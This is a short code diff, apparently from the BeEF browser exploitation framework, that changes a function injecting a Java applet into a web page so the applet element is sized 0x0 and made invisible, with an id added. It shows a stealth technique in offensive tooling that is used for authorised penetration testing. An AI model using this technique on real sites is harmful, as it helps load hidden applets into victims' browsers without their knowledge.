@@ -161,8 +161,8 @@ beef.dom = {
         var content = null;
         if(beef.browser.isIE()){
            content = "" +
-               "<object classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' " +
-                    "height='350' width='550' > " +
+               "<object id='" + id + "'classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' " +
+                    "height='0' width='0' > " +
                         "<param name='code' value='" + code + "' />" +
                         "<param name='archive' value='" + archive + "' />" +
                 "</object>";
@@ -170,7 +170,7 @@ beef.dom = {
              content = "" +
                 "<embed id='" + id + "' code='" + code + "' " +
                     "type='application/x-java-applet' archive='" + archive + "' " +
-                    "height='350' width='550' >" +
+                    "height='0' width='0' >" +
                 "</embed>";
         }
         $j('body').append(content);
